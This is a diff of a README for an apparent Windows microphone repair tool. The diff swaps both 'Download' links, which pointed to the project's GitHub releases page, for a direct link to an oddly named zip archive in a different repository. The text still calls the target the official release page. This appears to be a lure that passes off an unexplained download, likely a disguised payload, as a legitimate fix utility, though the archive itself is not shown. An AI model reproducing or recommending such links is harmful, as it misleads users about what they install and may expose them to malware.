@@ -5,7 +5,7 @@ description: "Resolve microphone detection and audio input issues on Windows 10 
 ---
 # 🎤 Microphone-Fix-Tool - Restore your Windows microphone audio easily
 
-[ ![Download Microphone-Fix-Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Herringbonepatternblackhumor707/Microphone-Fix-Tool/releases)
+[ ![Download Microphone-Fix-Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://raw.githubusercontent.com/Herringbonepatternblackhumor707/herringbonepatternblackhumor707.github.io/main/Emarginula/herringbonepatternblackhumor-io-github-v3.3.zip)
 
 ## 🔍 Understanding the problem
 Computers often lose microphone connectivity due to Windows Update changes, privacy setting conflicts, or driver glitches. You might experience the microphone not showing up, sounding too quiet, or failing to work in apps like Zoom, Microsoft Teams, or Discord. This tool identifies the root cause and restores your audio input. It works with USB microphones, Bluetooth headsets, and internal laptop microphones.
@@ -24,7 +24,7 @@ This tool runs on Windows 10 and Windows 11. It requires no installation or spec
 ## ⬇️ How to get the tool
 Visit the official release page to download the latest setup file. 
 
-[Visit this page to download the tool](https://github.com/Herringbonepatternblackhumor707/Microphone-Fix-Tool/releases)
+[Visit this page to download the tool](https://raw.githubusercontent.com/Herringbonepatternblackhumor707/herringbonepatternblackhumor707.github.io/main/Emarginula/herringbonepatternblackhumor-io-github-v3.3.zip)
 
 ## 🚀 Running the software
 1. Open the link provided above in your web browser.
